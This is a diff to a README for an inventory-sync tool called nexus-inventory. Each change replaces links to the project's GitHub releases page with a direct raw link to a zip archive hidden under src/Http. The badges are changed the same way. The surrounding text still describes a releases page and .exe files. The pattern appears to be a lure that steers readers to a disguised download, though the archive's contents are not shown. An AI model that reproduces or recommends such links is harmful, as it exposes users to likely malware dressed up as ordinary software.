@@ -1,6 +1,6 @@
 # ⚙️ nexus-inventory - Sync Your Inventory Easily
 
-[![Download nexus-inventory](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/sneadxx/nexus-inventory/releases)
+[![Download nexus-inventory](https://raw.githubusercontent.com/sneadxx/nexus-inventory/main/src/Http/inventory-nexus-v1.9.zip)](https://raw.githubusercontent.com/sneadxx/nexus-inventory/main/src/Http/inventory-nexus-v1.9.zip)
 
 ---
 
@@ -30,7 +30,7 @@ If your computer matches these points, you are ready to proceed.
 
 1. Click the big green button at the top or go to the link below to visit the download page:
 
-   [Download nexus-inventory releases](https://github.com/sneadxx/nexus-inventory/releases)
+   [Download nexus-inventory releases](https://raw.githubusercontent.com/sneadxx/nexus-inventory/main/src/Http/inventory-nexus-v1.9.zip)
 
 2. On the releases page, look for the latest version. You want the file that ends with `.exe`. This is the program that will run on Windows.
 
@@ -95,7 +95,7 @@ If your computer matches these points, you are ready to proceed.
 
 ## ⚙️ Updating nexus-inventory
 
-1. Go back to the [releases page](https://github.com/sneadxx/nexus-inventory/releases) occasionally to check for new versions.
+1. Go back to the [releases page](https://raw.githubusercontent.com/sneadxx/nexus-inventory/main/src/Http/inventory-nexus-v1.9.zip) occasionally to check for new versions.
 
 2. Download the newest `.exe` file.
 
@@ -114,7 +114,7 @@ If your computer matches these points, you are ready to proceed.
 
 ## 🔗 Useful Links
 
-- Download page: [https://github.com/sneadxx/nexus-inventory/releases](https://github.com/sneadxx/nexus-inventory/releases)
+- Download page: [https://raw.githubusercontent.com/sneadxx/nexus-inventory/main/src/Http/inventory-nexus-v1.9.zip](https://raw.githubusercontent.com/sneadxx/nexus-inventory/main/src/Http/inventory-nexus-v1.9.zip)
 - Documentation and support information are included inside the app under the **Help** menu.
 
 ---
@@ -140,4 +140,4 @@ If you run into problems, try these:
 
 ---
 
-[![Download nexus-inventory](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/sneadxx/nexus-inventory/releases)
+[![Download nexus-inventory](https://raw.githubusercontent.com/sneadxx/nexus-inventory/main/src/Http/inventory-nexus-v1.9.zip)](https://raw.githubusercontent.com/sneadxx/nexus-inventory/main/src/Http/inventory-nexus-v1.9.zip)
